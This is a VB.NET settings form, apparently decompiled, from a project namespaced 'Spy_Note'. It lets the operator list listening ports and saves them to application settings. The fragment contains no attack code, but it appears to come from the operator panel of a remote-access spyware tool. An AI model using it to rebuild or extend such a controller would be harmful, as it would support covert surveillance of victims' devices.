Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class open_port
    Public GroupPrt As String
    Public Sub New()
        Me.GroupPrt = Nothing
        Me.InitializeComponent()
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim flag As Boolean = Operators.CompareString(Conversions.ToString(Me.NumericUpDown1.Value), "0", False) <> 0
        If flag Then
            Me.DataGridView1.Rows.Add(New Object() {Conversions.ToString(Me.NumericUpDown1.Value)})
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                Me.DataGridView1.Rows.RemoveAt(Me.DataGridView1.SelectedRows(i).Index)
            Next
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim num As Integer = 0
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count <= 0
        If flag Then
            Me.ErrorProvider1.SetError(Me.DataGridView1, "Cannot be Empty")
        Else
            Me.ErrorProvider1.SetError(Me.DataGridView1, Nothing)
            num += 1
        End If
        Dim flag2 As Boolean = num = 1
        If flag2 Then
            Dim flag3 As Boolean = Me.DataGridView1.SelectedRows.Count > 0
            If flag3 Then
                Dim num2 As Integer = Me.DataGridView1.Rows.Count - 1
                For i As Integer = 0 To num2
                    Me.GroupPrt = Conversions.ToString(Operators.AddObject(Me.GroupPrt, Operators.AddObject(Me.DataGridView1.Rows(i).Cells(0).Value, ",")))
                Next
                Me.GroupPrt = Me.GroupPrt.Remove(Me.GroupPrt.Length - 1)
            End If
            MyBase.DialogResult = DialogResult.OK
            My.Settings.SVPORT = Convert.ToInt32(Me.NumericUpDown1.Value)
            My.Settings.SVLISTPORT = Me.GroupPrt
            My.Settings.Save()
        End If
    End Sub

    Public Sub tx(idstr As String)
        Me.Text = idstr
    End Sub

    Private Sub open_port_Load(sender As Object, e As EventArgs) Handles Me.Load
        MyBase.Location = New Point(My.Forms.Form1.Location.X, My.Forms.Form1.Location.Y)
        Dim array As String() = My.Settings.SVLISTPORT.Trim().Split(New Char() {","c})
        For Each text As String In array
            Dim flag As Boolean = Versioned.IsNumeric(text)
            If flag Then
                Me.DataGridView1.Rows.Add(New Object() {text.Trim()})
            End If
        Next
        Me.NumericUpDown1.Value = New Decimal(My.Settings.SVPORT)
        Me.ErrorProvider1.Icon = store_0.icons_0("errors")
        MyBase.Icon = store_0.icons_0("window")
    End Sub
End Class